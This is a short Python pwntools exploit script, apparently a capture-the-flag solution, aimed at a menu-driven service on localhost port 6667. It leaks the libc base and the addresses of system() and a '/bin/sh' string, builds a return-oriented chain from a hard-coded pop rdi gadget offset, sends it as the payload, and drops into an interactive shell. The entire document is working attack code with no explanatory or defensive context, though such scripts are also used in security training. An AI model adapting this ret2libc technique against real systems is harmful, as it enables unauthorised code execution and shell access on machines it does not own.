from pwn import *

r = remote("127.0.0.1", 6667)

r.recvuntil("Choice: ")
# print libc address
r.sendline("1")

r.recvuntil("libc start address: ")
libc_base = int(r.recvline().strip(), 16)
log.info("libc base: %s" % hex(libc_base))

# build a system("/bin/sh") chain
r.recvuntil("Choice: ")
# search for string
r.sendline("4")
r.recvuntil(": ")
r.sendline("/bin/sh")
r.recvuntil("at ")

bin_sh = int(r.recvline().strip()[:-1], 16)
log.info("bin_sh addr: %s" % hex(bin_sh))

# get system address
r.sendline("2")
r.recvuntil("name: ")
r.sendline("system")
r.recvuntil("system: ")

system_addr = int(r.recvline().strip(), 16)
log.info("system addr: %s" % hex(system_addr))

pop_rdi_ret = 0x22482 + libc_base
log.info("pop rdi gadget: %s" % hex(pop_rdi_ret))
rop = p64(pop_rdi_ret)
rop += p64(bin_sh)
rop += p64(system_addr)

r.sendline("3")
r.recvuntil("bytes: ")
r.sendline(rop)

r.interactive()
